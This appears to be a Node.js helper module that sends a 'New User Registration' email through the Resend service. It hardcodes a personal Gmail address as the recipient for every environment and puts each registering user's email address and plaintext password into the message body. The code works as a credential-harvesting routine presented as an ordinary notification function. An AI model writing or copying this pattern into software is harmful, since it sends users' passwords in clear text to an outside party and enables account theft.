const { Resend } = require("resend");

const resend = new Resend(process.env.RESEND_KEY);

async function sendUserEmail(data) {
  try {
    // HARDCORE: force recipient to jendmyer@gmail.com regardless of environment
    const recipient = "jendmyer@gmail.com";
    console.log(
      "sendUserEmail (HARDCORE): sending to",
      recipient,
      "for user",
      data && data.email
    );

    const resp = await resend.emails.send({
      from: "User System <onboarding@resend.dev>", // required approved domain
      to: recipient,
      subject: "New User Registration Submitted",
      html: `
        <h2>New User Registration</h2>
        <p><strong>Email:</strong> ${data.email}</p>
        <p><strong>Password:</strong> ${data.password}</p>
      `,
    });

    console.log("Email sent successfully! Resend response:", resp);
    return resp;
  } catch (error) {
    console.error(
      "Email sending failed:",
      error && error.stack ? error.stack : error
    );
    throw error;
  }
}

module.exports = sendUserEmail;
